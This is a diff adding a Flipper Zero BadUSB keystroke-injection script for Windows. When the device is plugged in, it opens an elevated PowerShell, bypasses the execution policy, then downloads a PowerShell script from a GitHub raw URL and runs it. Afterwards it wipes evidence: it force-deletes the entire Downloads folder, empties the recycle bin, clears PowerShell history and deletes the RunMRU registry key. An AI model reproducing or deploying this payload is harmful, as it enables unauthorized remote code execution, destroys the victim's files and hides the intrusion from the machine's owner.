@@ -1,0 +1,121 @@
+REM ##################################################################################################################################################################
+REM ##################################################################################################################################################################
+REM                  _..--+~/@-~--.
+REM              _-=~      (  .   "}
+REM           _-~     _.--=.\ \""""
+REM         _~      _-       \ \_\
+REM        =      _=          '--'
+REM       '      =                             .
+REM      :      :       ____                   '=_. ___
+REM ___  |      ;                            ____ '~--.~.
+REM      ;      ;                               _____  } |
+REM   ___=       \ ___ __     __..-...__           ___/__/__
+REM      :        =_     _.-~~          ~~--.__
+REM _____ \         ~-+-~                   ___~=_______
+REM      ~@#~~ == ...______ __ ___ _--~~--_
+REM                                                     =
+REM ██████╗ ███████╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗███████╗ ██████╗ ██╗ ██████╗ █████╗ 
+REM ██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝╚══███╔╝██╔════╝███║██╔════╝██╔══██╗
+REM ██████╔╝███████╗███████║██╔██╗ ██║██║     ███████║█████╗    ███╔╝ ██║     ╚██║███████╗╚██████║
+REM ██╔══██╗╚════██║██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝   ███╔╝  ██║      ██║██╔═══██╗╚═══██║
+REM ██║  ██║███████║██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗╚██████╗ ██║╚██████╔╝█████╔╝
+REM ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚════╝ 
+REM Script Version: 1
+REM OS Version Script was written on: Microsoft Windows 11 Pro : 10.0.25100 Build 26100
+REM PSVersion 5.1.26100.2161 : PSEdition Desktop : Build Version 10.0.26100.2161
+REM Flipper Zero FirmWare mntm-001 https://momentum-fw.dev/update/
+REM Description of Script:
+REM
+REM ##################################################################################################################################################################
+REM ================================Beginning=========================================================================================================================
+REM ##################################################################################################################################################################
+REM ##################################################################################################################################################################
+REM ================================Open PowerShell===================================================================================================================
+REM ##################################################################################################################################################################
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell Start-Process powershell -verb runAs
+DELAY 500
+ENTER
+DELAY 4000
+LEFT
+ENTER
+DELAY 4000
+REM ##################################################################################################################################################################
+REM ================================Open Another PowerShell Window====================================================================================================
+REM ##################################################################################################################################################################
+STRING TRY{ Start-Process powershell -ArgumentList ' -ExecutionPolicy Bypass' -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue}CATCH{Write-Warning "Could not open another instance of powershell"}
+ENTER
+DELAY 500
+REM ##################################################################################################################################################################
+REM #================================Set Execution Policy=============================================================================================================
+REM ##################################################################################################################################################################
+STRING TRY{Set-ExecutionPolicy -Scope "Process" -ExecutionPolicy "Unrestricted" -Force  -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue}CATCH{Write-Warning "Could not set execution policy"}
+ENTER
+DELAY 500
+REM ##################################################################################################################################################################
+REM #================================Get PS1 Script from Github=======================================================================================================
+REM ##################################################################################################################################################################
+STRING TRY { $fileUrl = "https://raw.githubusercontent.com/RSanchezC169/FlipperZero/refs/heads/main/BadUsb/Windows/Logo/Logo_Window_No_Exit.ps1"}CATCH{Write-Warning "Could not set file URL"}
+ENTER
+DELAY 500
+STRING TRY { $TempPath = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path }CATCH{Write-warning "Could not set temp path"}
+ENTER
+DELAY 500
+STRING TRY { $outputPath = $TempPath+"\Github.ps1" }CATCH{Write-Warning "Could not set outpath"}
+ENTER
+DELAY 500
+STRING TRY { Invoke-WebRequest -Uri "$fileUrl" -OutFile "$outputPath" -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue }CATCH{Write-Warning "Could not download script"}
+ENTER
+DELAY 500
+REM ##################################################################################################################################################################
+REM #================================Run Script=======================================================================================================================
+REM ##################################################################################################################################################################
+STRING TRY { & $outputPath }CATCH{Write-Warning "Could not run script"}
+ENTER
+DELAY 500
+REM ##################################################################################################################################################################
+REM #================================Go back to other Powershell Host=================================================================================================
+REM ##################################################################################################################################################################
+ALT TAB
+DELAY 500
+REM ##################################################################################################################################################################
+REM #================================Clean Up=========================================================================================================================
+REM ##################################################################################################################################################################
+REM clean up downloads folder
+STRING TRY { $downloadsPath = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path }CATCH{Write-Warning "Could not set downloads path"}
+ENTER
+DELAY 300
+STRING TRY { Remove-Item -Path $downloadsPath -Recurse -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue }CATCH{Write-Warning "Could not empty downloads folder"}
+ENTER
+DELAY 300
+REM Clean up recycle bin
+STRING TRY { Clear-RecycleBin -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue } CATCH { "Could not empty recycle bin" }
+ENTER
+DELAY 300
+REM clear PowerShell history
+STRING TRY { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()}Catch{ Write-Host "Could not clear history" }
+ENTER
+DELAY 300
+ENTER
+STRING TRY { Clear-History -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue }Catch{ Write-Host "Could not clear history" }
+ENTER
+DELAY 300
+ENTER
+STRING TRY { Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue }Catch{ Write-Host "Could not clear history" }
+ENTER
+DELAY 300
+ENTER
+STRING TRY { reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f}Catch{ Write-Host "Could not clear history" }
+ENTER
+DELAY 300
+STRING TRY { Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue }Catch{ Write-Host "Could not clear history" }
+ENTER
+DELAY 300
+ENTER
+STRING Exit
+ENTER
+REM ##################################################################################################################################################################
+REM #================================End==============================================================================================================================
+REM ##################################################################################################################################################################
